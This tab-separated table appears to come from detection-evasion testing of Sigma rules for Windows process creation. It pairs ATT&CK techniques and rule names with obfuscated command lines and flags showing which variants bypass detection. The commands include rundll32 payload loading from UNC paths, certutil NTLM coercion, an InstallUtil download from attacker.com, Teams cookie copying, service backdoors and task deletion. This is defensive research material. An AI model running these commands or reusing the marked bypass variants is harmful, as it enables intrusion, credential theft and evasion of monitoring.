Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1204.004	proc_creation_win_filefix_browsers	FileFix - Suspicious Child Process from Browser File Upload Abuse	4be03877-d5b6-4520-85c9-a5911c0a656c		"file:///C:/Windows/explorer.exe#""C:\Windows\System32\cmd.exe /c calc.exe"""	FALSE	FALSE	FALSE	
t1210.001	proc_creation_win_hktl_sharpwsus_wsuspendu_execution	HackTool - SharpWSUS/WSUSpendu Execution	b0ce780f-10bd-496d-9067-066d23dc3aa5		"cmd.exe /c ""SharpWSUS.exe c^reate /p^ayload:C:\temp\payload.exe"""	FALSE	FALSE	FALSE	
t1212.003	proc_creation_win_rundll32_ntlmrelay	Suspicious NTLM Authentication on the Printer Spooler Service	bb76d96b-821c-47cf-944b-7ce377864492		rundll32.exe C:\Windows\.\System32\davclnt.dll,DavSetCookie http://attacker/spoolss	TRUE	TRUE	TRUE	
t1212.004	proc_creation_win_rundll32_ntlmrelay	Suspicious NTLM Authentication on the Printer Spooler Service	bb76d96b-821c-47cf-944b-7ce377864492		rundll32.exe davclnt.dll,DavSetCookie http://attacker/spoolss	TRUE	TRUE	TRUE	
t1216.001	proc_creation_win_lolbin_manage_bde	Potential Manage-bde.wsf Abuse To Proxy Execution	c363385c-f75d-4753-a108-c1a8e28bdbda		"cmd.exe /c ""cd /d C:\Windows\System32\ && cscript.exe //nologo manage-bde.wsf"""	FALSE	FALSE	FALSE	
t1217.001	proc_creation_win_cmd_dir_execution	File And SubFolder Enumeration Via Dir Command	7c9340a9-e2ee-4e43-94c5-c54ebbea1006		"cmd.exe /c ""for /R C:\ %i in (*) do @echo %i"""	FALSE	FALSE	FALSE	
t1217.002	proc_creation_win_cmd_dir_execution	File And SubFolder Enumeration Via Dir Command	7c9340a9-e2ee-4e43-94c5-c54ebbea1006		"cmd.exe /c ""set d=di && set r=r && call %d%%r% /s"""	FALSE	FALSE	FALSE	
t1217.003	proc_creation_win_cmd_dir_execution	File And SubFolder Enumeration Via Dir Command	7c9340a9-e2ee-4e43-94c5-c54ebbea1006		"cmd.exe /c ""tree C:\ /F"""	FALSE	FALSE	FALSE	
t1217.006	proc_creation_win_where_browser_data_recon	Suspicious Where Execution	725a9768-0f5e-4cb3-aec2-bc5719c6831a		where /R C:\Users\ *ookmarks	TRUE	TRUE	TRUE	
t1218.007	proc_creation_win_msiexec_embedding	Suspicious MsiExec Embedding Parent	4a2a2c3e-209f-4d01-b513-4155a540b469		"C:\Windows\System32\cmd.exe /c ""echo bypass > C:\Program Files\SplunkUniversalForwarder\bin\dummy.txt"""	FALSE	FALSE	FALSE	
t1218.009	proc_creation_win_regasm_regsvcs_uncommon_extension_execution	Potentially Suspicious Execution Of Regasm/Regsvcs With Uncommon Extension	e9f8f8cc-07cc-4e81-b724-f387db9175e4		"cmd.exe /c ""Regasm.exe /U C:\temp\payload.t^xt"""	FALSE	FALSE	FALSE	
t1218.010	proc_creation_win_regsvr32_susp_exec_path_1	Regsvr32 Execution From Potential Suspicious Location	9525dc73-0327-438c-8c04-13c0e037e9da		"cmd.exe /c ""cd C:\ProgramData && regsvr32.exe payload.dll"""	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9		rundll32.exe shell32.dll,#250	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_susp_control_dll_load	Suspicious Control Panel DLL Load	d7eb979b-c2b5-4a6f-a3a7-c87ce6763819		"rundll32.exe C:\Windows\Temp\payload.dll,DllMain ""Shell32.dll"""	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_susp_execution_with_image_extension	Suspicious Rundll32 Execution With Image Extension	4aa6040b-3f28-44e3-a769-9208e5feb5ec		cd C:\test\ && copy malicious.dll photo.jpg && rundll32.exe .\photo.jpg,DllMain	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_susp_execution_with_image_extension	Suspicious Rundll32 Execution With Image Extension	4aa6040b-3f28-44e3-a769-9208e5feb5ec		copy calc.dll calc.dat && rundll32.exe calc.dat,DllMain	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_udl_exec	Potentially Suspicious Rundll32.EXE Execution of UDL File	0ea52357-cd59-4340-9981-c46c7e900428		cmd.exe /c rundll32.exe oledb32.dll,OpenDSLFile C:\Users\user\Downloads\test.udl	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_udl_exec	Potentially Suspicious Rundll32.EXE Execution of UDL File	0ea52357-cd59-4340-9981-c46c7e900428		"rundll32.exe oledb32.dll,OpenDSLFile ""C:\Users\admin\Downloads\test.udl"""	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_udl_exec	Potentially Suspicious Rundll32.EXE Execution of UDL File	0ea52357-cd59-4340-9981-c46c7e900428		rundll32.exe oledb32.dll,OpenDSLFile C:\ProgramData\test.udl	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_unc_path	Rundll32 UNC Path Execution	5cdb711b-5740-4fb2-ba88-f7945027afac		rundll32.exe //192.168.1.100/share/payload.dll,EntryPoint	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf		rundll32.exe C:\temp\payload.bin,Start dummy.dll	TRUE	TRUE	TRUE	
t1218.013	proc_creation_win_atbroker_uncommon_ats_execution	Uncommon  Assistive Technology Applications Execution Via AtBroker.EXE	f24bcaea-0cd1-11eb-adc1-0242ac120002		AtBroker.exe /start C:\public\Oracle_JavaAccessBridge\payload.exe	TRUE	TRUE	TRUE	
t1218.014	proc_creation_win_atbroker_uncommon_ats_execution	Uncommon  Assistive Technology Applications Execution Via AtBroker.EXE	f24bcaea-0cd1-11eb-adc1-0242ac120002		AtBroker.exe /start C:\temp\osk.exe	TRUE	TRUE	TRUE	
t1218.028	proc_creation_win_certutil_ntlm_coercion	Potential NTLM Coercion Via Certutil.EXE	6c6d9280-e6d0-4b9d-80ac-254701b64916		"certutil.exe -syncwithWU""\\10.10.10.10\share"""	TRUE	TRUE	TRUE	
t1218.029	proc_creation_win_certutil_ntlm_coercion	Potential NTLM Coercion Via Certutil.EXE	6c6d9280-e6d0-4b9d-80ac-254701b64916		certutil.exe /syncwithWU \\192.168.1.100\share	TRUE	TRUE	TRUE	
t1218.034	proc_creation_win_cmd_redirection_susp_folder	Potentially Suspicious CMD Shell Output Redirect	8e0bb260-d4b2-4fff-bb8d-3f82118e6892		"cmd.exe /c ""cd C:\Windows\Temp && hostname > output.txt"""	FALSE	FALSE	FALSE	
t1218.035	proc_creation_win_cmd_redirection_susp_folder	Potentially Suspicious CMD Shell Output Redirect	8e0bb260-d4b2-4fff-bb8d-3f82118e6892		"cmd.exe /c ""set p=C:\ProgramData\ && call echo recon_data > %p%out.txt"""	FALSE	FALSE	FALSE	
t1218.036	proc_creation_win_cmd_redirection_susp_folder	Potentially Suspicious CMD Shell Output Redirect	8e0bb260-d4b2-4fff-bb8d-3f82118e6892		"cmd.exe /c ""systeminfo >  C:\ProgramData\info.txt"""	FALSE	FALSE	FALSE	
t1218.037	proc_creation_win_cmdl32_arbitrary_file_download	Potential Arbitrary File Download Via Cmdl32.EXE	f37aba28-a9e6-4045-882c-d5004043b337		cmdl32.exe -vpn -lan C:\path\to\config.txt	TRUE	TRUE	TRUE	
t1218.065	proc_creation_win_dsacls_password_spray	Potential Password Spraying Attempt Using Dsacls.EXE	bac9fb54-2da7-44e9-988f-11e9a5edbc0c		set P=/passwd: && dsacls.exe /user:admin %P%Password123	FALSE	FALSE	FALSE	
t1218.079	proc_creation_win_hktl_zipexec	Suspicious ZipExec Execution	90dcf730-1b71-4ae7-9ffc-6fcf62bd0132		"cmd.exe /c ""cmdkey.exe /del^ete:Microsoft_Windows_Shell_ZipFolder:filename=payload.z^ip"""	FALSE	FALSE	FALSE	
t1218.082	proc_creation_win_hktl_zipexec	Suspicious ZipExec Execution	90dcf730-1b71-4ae7-9ffc-6fcf62bd0132		copy payload.zip payload.txt && certutil -decodehex payload.txt payload.exe	TRUE	TRUE	TRUE	
t1218.092	proc_creation_win_installutil_download	File Download Via InstallUtil.EXE	75edd216-1939-4c73-8d61-7f3a0d85b5cc		"cmd.exe /c ""InstallUtil.exe /logfile= /LogToConsole=false /U h^t^tp://[attacker.com/payload.dll](https://www.google.com/search?q=https://attacker.com/payload.dll)"""	FALSE	FALSE	FALSE	
t1218.205	proc_creation_win_verclsid_runs_com	Verclsid.exe Runs COM Object	d06be4b9-8045-428b-a567-740a26d9db25		verclsid.exe -S -C {11111111-2222-3333-4444-555555555555}	TRUE	TRUE	TRUE	
t1218.207	proc_creation_win_vscode_child_processes_anomalies	Potentially Suspicious Child Process Of VsCode	5a3164f2-b373-4152-93cf-090b13c12d27		cmd.exe /c r^undll32.exe C:\ProgramData\payload.dll,DllMain	TRUE	TRUE	TRUE	
t1218.214	proc_creation_win_vslsagent_agentextensionpath_load	Suspicious Vsls-Agent Command With AgentExtensionPath Load	43103702-5886-11ed-9b6a-0242ac120002		copy vsls-agent.exe renamed-agent.exe && renamed-agent.exe --agentExtensionPath C:\evil.dll	TRUE	TRUE	TRUE	
t1218.218	proc_creation_win_wlrmdr_uncommon_child_process	Wlrmdr.EXE Uncommon Argument Or Child Process	9cfc00b6-bfb7-49ce-9781-ef78503154bb		wlrmdr.exe -s 1 -f 1 -t 1 -m 1 -a 1	TRUE	TRUE	TRUE	
t1218.226	proc_creation_win_xwizard_runwizard_com_object_exec	COM Object Execution via Xwizard.EXE	53d4bb30-3f36-4e8a-b078-69d36c4a79ff		"xwizard RunWizard ""{53d4bb30 - 3f36 - 4e8a - b078 - 69d36c4a79ff}"""	TRUE	TRUE	TRUE	
t1218.227	proc_creation_win_xwizard_runwizard_com_object_exec	COM Object Execution via Xwizard.EXE	53d4bb30-3f36-4e8a-b078-69d36c4a79ff		xwizard.exe RunWizard {a1b2c3d4-e5f6-7890-abcd-ef1234567890}	TRUE	TRUE	FALSE	Weak or Abused Passwords In CLI (91edcfb1-2529-4ac2-9ecc-7617f895c7e4); Weak or Abused Passwords In CLI (91edcfb1-2529-4ac2-9ecc-7617f895c7e4)
t1219.002	proc_creation_win_mstsc_run_local_rdp_file	Mstsc.EXE Execution With Local RDP File	5fdce3ac-e7f9-4ecd-a3aa-a4d78ebbf0af		"mstsc.exe ""C:\Temp\hidden.rdp"""	TRUE	TRUE	TRUE	
t1219.002	proc_creation_win_mstsc_run_local_rdp_file	Mstsc.EXE Execution With Local RDP File	5fdce3ac-e7f9-4ecd-a3aa-a4d78ebbf0af		"mstsc.exe ""C:\Users\Public\malicious.rdp"" /f"	TRUE	TRUE	TRUE	
t1219.002	proc_creation_win_mstsc_run_local_rdp_file_susp_location	Suspicious Mstsc.EXE Execution With Local RDP File	6e22722b-dfb1-4508-a911-49ac840b40f8		"mstsc.exe ""C:\Users\Public\connection.rdp"""	TRUE	TRUE	TRUE	
t1219.002	proc_creation_win_mstsc_run_local_rdp_file_susp_location	Suspicious Mstsc.EXE Execution With Local RDP File	6e22722b-dfb1-4508-a911-49ac840b40f8		mstsc.exe C:\Windows\Temp\payload.rdp /f	TRUE	TRUE	TRUE	
t1219.002	proc_creation_win_remote_access_tools_anydesk_piped_password_via_cli	Remote Access Tool - AnyDesk Piped Password Via CLI	b1377339-fda6-477a-b455-ac0923f9ec2c		"cmd.exe /c""echo(J9kzQ2Y0qO|anydesk --set-password"""	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_renamed_meshagent_execution	Remote Access Tool - Renamed MeshAgent Execution - Windows	b471f462-eb0d-4832-be35-28d94bdb4780		"C:\Windows\System32\cmd.exe /c ""svchost.exe --m^eshServiceName"""	FALSE	FALSE	FALSE	
t1484.001	proc_creation_win_reg_modify_group_policy_settings	Modify Group Policy Settings	ada4b0c4-758b-46ac-9033-9004613a150d		"reg.exe add ""HKLM\S^OFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTime /t REG_DWORD /d 10 /f"	TRUE	TRUE	TRUE	
t1486.004	proc_creation_win_reg_bitlocker	Suspicious Reg Add BitLocker	0e0255bf-2548-47b8-9582-c0955c9283f5		"reg.exe add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v ""EnableBDE""^""WithNoTPM"" /t REG_DWORD /d 1 /f"	TRUE	TRUE	TRUE	
t1489.001	proc_creation_win_net_stop_service	Stop Windows Service Via Net.EXE	88872991-7445-4a22-90b2-a3adadb0e827		"net.exe	stop	""ServiceName"""	TRUE	TRUE	TRUE	
t1489.012	proc_creation_win_schtasks_delete_all	Delete All Scheduled Tasks	220457c1-1c9f-4c2e-afe6-9598926222c1		schtasks.exe -delete -tn * -f	TRUE	TRUE	TRUE	
t1505.003	proc_creation_win_webshell_chopper	Chopper Webshell Process Pattern	fa3c117a-bc0d-416e-a31b-0c0e80653efb		"cmd.exe /c ""&wh^oami&echo"""	FALSE	FALSE	FALSE	
t1505.003	proc_creation_win_webshell_chopper	Chopper Webshell Process Pattern	fa3c117a-bc0d-416e-a31b-0c0e80653efb		"cmd.exe /c ""whoami & echo [E]"""	FALSE	FALSE	FALSE	
t1505.003	proc_creation_win_webshell_recon_commands_and_processes	Webshell Detection With Command Line Keywords	bed2a484-9348-4143-8a8a-b801c979301c		ping.exe /n 4 10.10.10.10	TRUE	TRUE	TRUE	
t1505.003	proc_creation_win_webshell_tool_recon	Webshell Tool Reconnaissance Activity	f64e5c19-879c-4bae-b471-6d84c8339677		"cmd.exe /c ""p^y^t^h^o^n -h"""	FALSE	FALSE	FALSE	
t1505.003	proc_creation_win_webshell_tool_recon	Webshell Tool Reconnaissance Activity	f64e5c19-879c-4bae-b471-6d84c8339677		python  -h	TRUE	TRUE	TRUE	
t1505.003	proc_creation_win_webshell_tool_recon	Webshell Tool Reconnaissance Activity	f64e5c19-879c-4bae-b471-6d84c8339677		python -V	TRUE	TRUE	TRUE	
t1505.003	proc_creation_win_webshell_tool_recon	Webshell Tool Reconnaissance Activity	f64e5c19-879c-4bae-b471-6d84c8339677		python.exe -h	TRUE	TRUE	TRUE	
t1518.001	proc_creation_win_findstr_security_keyword_lookup	Security Tools Keyword Lookup Via Findstr.EXE	4fe074b4-b833-4081-8f24-7dcfeca72b42		"tasklist | findstr /R ""defende[r]"""	TRUE	TRUE	FALSE	Recon Command Output Piped To Findstr.EXE (ccb5742c-c248-4982-8c5c-5571b9275ad3)
t1518.001	proc_creation_win_findstr_sysmon_discovery_via_default_altitude	Sysmon Discovery Via Default Driver Altitude Using Findstr.EXE	37db85d1-b089-490a-a59a-c7b6f984f480		"fltmc.exe | findstr /R ""38520[1]"""	TRUE	TRUE	TRUE	
t1518.001	proc_creation_win_findstr_sysmon_discovery_via_default_altitude	Sysmon Discovery Via Default Driver Altitude Using Findstr.EXE	37db85d1-b089-490a-a59a-c7b6f984f480		"fltmc.exe | Select-String ""385201"""	FALSE	FALSE	FALSE	
t1528.003	proc_creation_win_teams_suspicious_command_line_cred_access	Potentially Suspicious Command Targeting Teams Sensitive Files	d2eb17db-1d39-41dc-b57f-301f6512fa75		"cmd.exe /c ""cd %APPDATA%\Microsoft\Teams && copy Cookies\* C:\temp\"""	FALSE	FALSE	FALSE	
t1528.004	proc_creation_win_teams_suspicious_command_line_cred_access	Potentially Suspicious Command Targeting Teams Sensitive Files	d2eb17db-1d39-41dc-b57f-301f6512fa75		"cmd.exe /c ""set A=\Microsoft\Teams& set B=\Cookies& call xcopy %APPDATA%%A%%B% C:\temp\ /E"""	FALSE	FALSE	FALSE	
t1543.003	proc_creation_win_sc_service_tamper_for_persistence	Potential Persistence Attempt Via Existing Service Tampering	38879043-7e1e-47a9-8d46-6bec88e201df		"reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\ExampleService"" /v ImagePath /t REG_EXPAND_SZ /d ""C:\Windows\Temp\backdoor"" /f"	TRUE	TRUE	TRUE	
t1543.003	proc_creation_win_susp_service_creation	Suspicious New Service Creation	17a1be64-8d88-40bf-b5ff-a4f7a50ebcc8		"reg add ""HKLM\System\CurrentControlSet\Services\MaliciousService"" /v ImagePath /t REG_EXPAND_SZ /d ""C:\Users\Public\malware.exe"" /f"	TRUE	TRUE	FALSE	Potential Persistence Attempt Via Existing Service Tampering (38879043-7e1e-47a9-8d46-6bec88e201df); Potential Persistence Attempt Via Existing Service Tampering (38879043-7e1e-47a9-8d46-6bec88e201df)
t1546.001	proc_creation_win_control_panel_item	Control Panel Items	0ba863e6-def5-4e50-9cea-4dd8c7dc46a4		control.exe C:\temp\System32\malicious.cpl	TRUE	TRUE	FALSE	Shell32 DLL Execution in Suspicious Directory (32b96012-7892-429e-b26c-ac2bf46066ff)
t1546.004	proc_creation_win_control_panel_item	Control Panel Items	0ba863e6-def5-4e50-9cea-4dd8c7dc46a4		"C:\Windows\System32\control.exe ""C:\Users\Public\Downloads\malicious.cpl """	TRUE	TRUE	FALSE	Shell32 DLL Execution in Suspicious Directory (32b96012-7892-429e-b26c-ac2bf46066ff)
t1546.005	proc_creation_win_control_panel_item	Control Panel Items	0ba863e6-def5-4e50-9cea-4dd8c7dc46a4		C:\Windows\System32\control.exe C:\Users\Public\Downloads\payload.dll	TRUE	TRUE	FALSE	Shell32 DLL Execution in Suspicious Directory (32b96012-7892-429e-b26c-ac2bf46066ff); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
